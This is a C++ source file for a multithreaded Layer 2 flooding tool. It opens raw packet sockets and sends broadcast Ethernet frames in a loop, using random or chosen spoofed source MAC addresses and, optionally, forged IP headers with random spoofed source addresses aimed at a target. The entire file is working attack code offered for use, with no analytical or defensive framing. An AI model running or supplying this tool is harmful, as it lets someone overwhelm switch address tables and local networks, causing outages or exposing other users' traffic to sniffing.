#include <iostream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <signal.h>
#include <thread>
#include <vector>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/ether.h>
#include <netpacket/packet.h>
#include <linux/if_ether.h>

volatile bool running = true;

struct eth_header {
    uint8_t dest_mac[6];
    uint8_t src_mac[6];
    uint16_t ether_type;
} __attribute__((packed));

void generate_random_mac(uint8_t* mac, int thread_id) {
    srand(time(NULL) ^ (thread_id * 12345));
    for (int i = 0; i < 6; i++) {
        mac[i] = rand() % 256;
    }
    mac[0] |= 0x02;
    mac[0] &= 0xFE;
}

bool parse_mac(const std::string& str, uint8_t* mac) {
    if (str == "random" || str == "flood" || str == "sequential") return false;
    int values[6];
    if (sscanf(str.c_str(), "%x:%x:%x:%x:%x:%x",
               &values[0], &values[1], &values[2],
               &values[3], &values[4], &values[5]) != 6) {
        return false;
    }
    for (int i = 0; i < 6; i++) {
        if (values[i] < 0 || values[i] > 255) return false;
        mac[i] = (uint8_t)values[i];
    }
    return true;
}

void build_ip_header(uint8_t* ip_buf, in_addr_t src_ip, in_addr_t dst_ip, uint16_t total_len) {
    memset(ip_buf, 0, 20);
    ip_buf[0] = 0x45;
    ip_buf[1] = 0;
    ip_buf[2] = (total_len >> 8) & 0xFF;
    ip_buf[3] = total_len & 0xFF;
    uint16_t id = rand() % 65535;
    ip_buf[4] = (id >> 8) & 0xFF;
    ip_buf[5] = id & 0xFF;
    ip_buf[6] = 0;
    ip_buf[7] = 0;
    ip_buf[8] = 64;
    ip_buf[9] = 17;
    ip_buf[10] = 0;
    ip_buf[11] = 0;
    ip_buf[12] = (src_ip >> 24) & 0xFF;
    ip_buf[13] = (src_ip >> 16) & 0xFF;
    ip_buf[14] = (src_ip >> 8) & 0xFF;
    ip_buf[15] = src_ip & 0xFF;
    ip_buf[16] = (dst_ip >> 24) & 0xFF;
    ip_buf[17] = (dst_ip >> 16) & 0xFF;
    ip_buf[18] = (dst_ip >> 8) & 0xFF;
    ip_buf[19] = dst_ip & 0xFF;
}

void flood_thread(int thread_id, const std::string& iface, int packet_count,
                  bool random_mode, const uint8_t* static_mac,
                  in_addr_t target_ip, bool has_target_ip) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        std::cerr << "[Thread " << thread_id << "] Error creating socket" << std::endl;
        return;
    }

    struct ifreq if_idx;
    memset(&if_idx, 0, sizeof(struct ifreq));
    strncpy(if_idx.ifr_name, iface.c_str(), IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFINDEX, &if_idx) < 0) {
        std::cerr << "[Thread " << thread_id << "] Error getting interface index" << std::endl;
        close(sock);
        return;
    }
    int ifindex = if_idx.ifr_ifindex;

    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));
    addr.sll_ifindex = ifindex;
    addr.sll_halen = ETH_ALEN;
    addr.sll_family = AF_PACKET;

    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    memcpy(addr.sll_addr, broadcast_mac, 6);

    uint8_t buffer[1514];
    eth_header* eth = (eth_header*)buffer;
    eth->ether_type = htons(0x0800);

    std::cout << "[Thread " << thread_id << "] Started flooding on " << iface << std::endl;
    int sent = 0;

    while (running && (packet_count == 0 || sent < packet_count)) {
        uint8_t src_mac[6];
        if (random_mode) {
            generate_random_mac(src_mac, thread_id);
        } else {
            memcpy(src_mac, static_mac, 6);
        }

        memcpy(eth->dest_mac, broadcast_mac, 6);
        memcpy(eth->src_mac, src_mac, 6);
        memset(buffer + sizeof(eth_header), 0xAA, 1500);

        if (has_target_ip) {
            in_addr_t src_ip = htonl(rand());
            build_ip_header(buffer + sizeof(eth_header), src_ip, target_ip, 1500);
        }

        if (sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            // std::cerr << "Send error" << std::endl;
        }
        sent++;

        if (packet_count > 100000) usleep(100);
    }
    std::cout << "[Thread " << thread_id << "] Sent " << sent << " packets." << std::endl;
    close(sock);
}

void print_usage(const char* prog) {
    std::cout << "Usage: " << prog << " <interface> <packets> <threads> <mac_mode> [target_ip]" << std::endl;
}

int main(int argc, char* argv[]) {
    if (argc < 5) {
        print_usage(argv[0]);
        return 1;
    }

    std::string interface = argv[1];
    int packet_count = std::atoi(argv[2]);
    int thread_count = std::atoi(argv[3]);
    std::string mac_arg = argv[4];

    in_addr_t target_ip = 0;
    bool has_target_ip = false;
    if (argc >= 6) {
        target_ip = inet_addr(argv[5]);
        if (target_ip != INADDR_NONE) {
            has_target_ip = true;
            std::cout << "Target IP set to: " << argv[5] << std::endl;
        }
    }

    if (thread_count <= 0 || thread_count > 100) {
        std::cerr << "Invalid thread count (1-100)" << std::endl;
        return 1;
    }

    uint8_t static_mac[6] = {0};
    bool random_mode = false;
    if (mac_arg == "random" || mac_arg == "flood" || mac_arg == "sequential") {
        random_mode = true;
        std::cout << "Mode: Random MAC Generation" << std::endl;
    } else if (!parse_mac(mac_arg, static_mac)) {
        std::cerr << "Invalid MAC address: " << mac_arg << std::endl;
        return 1;
    } else {
        std::cout << "Mode: Static MAC " << mac_arg << std::endl;
    }

    signal(SIGINT, [](int){ running = false; });
    signal(SIGTERM, [](int){ running = false; });
    srand(time(NULL));

    std::cout << "Starting MAC Flood on " << interface << " with " << thread_count << " threads..." << std::endl;

    std::vector<std::thread> threads;
    for (int i = 0; i < thread_count; i++) {
        threads.emplace_back(flood_thread, i, interface, packet_count, random_mode, static_mac,
                            target_ip, has_target_ip);
    }

    for (auto& t : threads) {
        t.join();
    }
    std::cout << "Flood finished." << std::endl;
    return 0;
}